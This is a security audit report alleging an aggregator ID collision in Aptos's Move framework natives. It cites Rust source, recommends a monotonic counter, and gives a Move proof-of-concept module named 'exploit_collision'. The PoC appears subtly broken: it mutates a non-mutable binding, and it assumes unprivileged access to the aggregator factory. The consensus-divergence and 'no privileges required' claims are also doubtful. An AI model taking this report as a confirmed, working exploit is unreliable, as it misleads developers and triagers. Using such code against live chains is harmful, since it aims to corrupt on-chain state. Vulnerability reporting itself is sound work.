# Audit Report

## Title
Hash Collision in Aggregator ID Generation Enables State Corruption via Counter Manipulation

## Summary
A critical vulnerability in `native_new_aggregator()` allows attackers to create aggregators with colliding AggregatorIDs within a single transaction. The root cause is using `num_aggregators()` (the current map length) instead of a monotonically increasing counter for ID generation. When aggregators are destroyed, the counter decreases, enabling subsequent aggregators to reuse the same hash inputs and overwrite existing aggregator state.

## Finding Description

The vulnerability exists in the aggregator ID generation logic. [1](#0-0) 

The hash is computed from:
1. `session_hash()` - constant within a transaction
2. `num_aggregators()` - the **current** length of the aggregators map

The critical flaw is that `num_aggregators()` returns the current map size: [2](#0-1) 

When an aggregator is destroyed via the `destroy` native function: [3](#0-2) 

The `remove_aggregator()` method removes it from the map: [4](#0-3) 

This causes `num_aggregators()` to **decrease**, allowing the same counter value to be reused.

**Attack Scenario:**

1. **Create Aggregator A**: `num_aggregators() = 0` → `hash(session_hash || 0)` → `ID_A`
2. **Create Aggregator B**: `num_aggregators() = 1` → `hash(session_hash || 1)` → `ID_B`  
3. **Destroy Aggregator A**: `aggregators.remove(ID_A)` → `num_aggregators() = 1`
4. **Create Aggregator C**: `num_aggregators() = 1` → `hash(session_hash || 1)` → `ID_C`
5. **Collision**: `ID_C == ID_B` (identical hash inputs)

When `create_new_aggregator(ID_C, limit)` is called: [5](#0-4) 

Line 327 uses `BTreeMap::insert()`, which **replaces** the existing aggregator B's state with aggregator C's state. Now two distinct Move `Aggregator` struct instances (B and C) share the same underlying `AggregatorID`, causing state corruption.

**Broken Invariants:**
- **State Consistency**: Two distinct Move objects incorrectly share the same storage state
- **Deterministic Execution**: Different validators may process create/destroy operations in different orders during parallel execution, leading to different final states

## Impact Explanation

**Severity: CRITICAL**

This vulnerability meets multiple critical severity criteria:

1. **State Corruption**: Aggregators are used throughout the Aptos Framework for critical state like coin supply tracking. State corruption can lead to incorrect balances and loss of funds.

2. **Consensus Safety Violation**: If different validators process transactions with different create/destroy orderings (due to speculative execution or timing), they will generate different aggregator IDs and divergent state roots, breaking consensus safety.

3. **Permanent State Damage**: Once aggregator state is overwritten, the original aggregator B becomes orphaned with its Move struct pointing to non-existent or incorrect state, requiring potential hardfork to remediate.

The impact aligns with Critical severity per Aptos Bug Bounty: "Consensus/Safety violations" and "Permanent freezing of funds (requires hardfork)".

## Likelihood Explanation

**Likelihood: HIGH**

The attack is trivially exploitable by any transaction sender:
- No special privileges required
- Simple Move code pattern: create aggregators, destroy one, create another
- Works within a single transaction
- No race conditions or timing dependencies needed
- The aggregator destroy functionality is publicly accessible

The vulnerability is deterministic and guaranteed to occur when the attack pattern is executed.

## Recommendation

Replace the non-monotonic counter with a truly monotonic counter that never decreases:

```rust
// In AggregatorData struct
pub struct AggregatorData {
    new_aggregators: BTreeSet<AggregatorID>,
    destroyed_aggregators: BTreeSet<AggregatorID>,
    aggregators: BTreeMap<AggregatorID, Aggregator>,
    // Add monotonic counter
    next_aggregator_id: u128,
}

// Update create_new_aggregator to increment counter
pub fn create_new_aggregator(&mut self, id: AggregatorID, max_value: u128) {
    let aggregator = Aggregator {
        value: 0,
        state: AggregatorState::Data,
        max_value,
        history: None,
    };
    self.aggregators.insert(id.clone(), aggregator);
    self.new_aggregators.insert(id);
    self.next_aggregator_id += 1; // Increment monotonic counter
}

// In native_new_aggregator, use the counter before incrementing
let counter = aggregator_data.next_aggregator_id;
hasher.update(&(counter as u32).to_be_bytes());
```

Alternatively, maintain a separate monotonic counter in `NativeAggregatorContext` that tracks total aggregators created (not destroyed) during the session.

## Proof of Concept

```move
module 0x1::aggregator_collision_test {
    use std::signer;
    use aptos_framework::aggregator::{Self, Aggregator};
    use aptos_framework::aggregator_factory;
    use aptos_std::table::{Self, Table};

    struct AggregatorStore has key {
        aggregators: Table<u64, Aggregator>,
    }

    public entry fun initialize(account: &signer) {
        let aggregators = table::new();
        move_to(account, AggregatorStore { aggregators });
    }

    // Exploit: Create A, Create B, Destroy A, Create C
    // C will collide with B, overwriting B's state
    public entry fun exploit_collision(account: &signer) acquires AggregatorStore {
        let addr = signer::address_of(account);
        let store = borrow_global_mut<AggregatorStore>(addr);
        
        // Create aggregator A (counter=0)
        let agg_a = aggregator_factory::create_aggregator(account, 1000);
        table::add(&mut store.aggregators, 0, agg_a);
        
        // Create aggregator B (counter=1) and add value
        let agg_b = aggregator_factory::create_aggregator(account, 1000);
        aggregator::add(&mut agg_b, 500);
        table::add(&mut store.aggregators, 1, agg_b);
        
        // Destroy aggregator A (counter becomes 1)
        let agg_a_removed = table::remove(&mut store.aggregators, 0);
        aggregator::destroy(agg_a_removed);
        
        // Create aggregator C (counter=1, COLLIDES WITH B!)
        let agg_c = aggregator_factory::create_aggregator(account, 1000);
        table::add(&mut store.aggregators, 2, agg_c);
        
        // At this point, aggregators at indices 1 and 2 share the same AggregatorID
        // Operations on one will affect the other
        
        // Add to C
        let agg_c_ref = table::borrow_mut(&mut store.aggregators, 2);
        aggregator::add(agg_c_ref, 100);
        
        // Read B - will show unexpected value due to shared state
        let agg_b_ref = table::borrow(&store.aggregators, 1);
        let value = aggregator::read(agg_b_ref);
        // Value will be corrupted/unexpected due to collision
    }
}
```

**Validation Steps:**
1. Deploy the test module
2. Call `initialize()` to set up the store  
3. Call `exploit_collision()` - this will create the collision
4. Observe that aggregators B and C share underlying state
5. Operations on either aggregator affect the other, demonstrating the collision

### Citations

**File:** aptos-move/framework/src/natives/aggregator_natives/aggregator_factory.rs (L50-53)
```rust
    let mut hasher = DefaultHasher::new(&[0_u8; 0]);
    hasher.update(&aggregator_context.session_hash());
    hasher.update(&(aggregator_data.num_aggregators() as u32).to_be_bytes());
    let hash = hasher.finish().to_vec();
```

**File:** aptos-move/aptos-aggregator/src/aggregator_v1_extension.rs (L313-315)
```rust
    pub fn num_aggregators(&self) -> u128 {
        self.aggregators.len() as u128
    }
```

**File:** aptos-move/aptos-aggregator/src/aggregator_v1_extension.rs (L320-329)
```rust
    pub fn create_new_aggregator(&mut self, id: AggregatorID, max_value: u128) {
        let aggregator = Aggregator {
            value: 0,
            state: AggregatorState::Data,
            max_value,
            history: None,
        };
        self.aggregators.insert(id.clone(), aggregator);
        self.new_aggregators.insert(id);
    }
```

**File:** aptos-move/aptos-aggregator/src/aggregator_v1_extension.rs (L333-345)
```rust
    pub fn remove_aggregator(&mut self, id: AggregatorID) {
        // Aggregator no longer in use during this transaction: remove it.
        self.aggregators.remove(&id);

        if self.new_aggregators.contains(&id) {
            // Aggregator has been created in the same transaction. Therefore, no
            // side-effects.
            self.new_aggregators.remove(&id);
        } else {
            // Otherwise, aggregator has been created somewhere else.
            self.destroyed_aggregators.insert(id);
        }
    }
```

**File:** aptos-move/framework/src/natives/aggregator_natives/aggregator.rs (L114-136)
```rust
fn native_destroy(
    context: &mut SafeNativeContext,
    _ty_args: &[Type],
    mut args: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    debug_assert_eq!(args.len(), 1);

    context.charge(AGGREGATOR_DESTROY_BASE)?;

    // First, unpack the struct.
    let aggregator_struct = safely_pop_arg!(args, Struct);
    let (handle, key, _) = unpack_aggregator_struct(aggregator_struct)?;

    // Get aggregator data.
    let aggregator_context = context.extensions().get::<NativeAggregatorContext>();
    let mut aggregator_data = aggregator_context.aggregator_v1_data.borrow_mut();

    // Actually remove the aggregator.
    let id = AggregatorID::new(handle, key);
    aggregator_data.remove_aggregator(id);

    Ok(smallvec![])
}
```
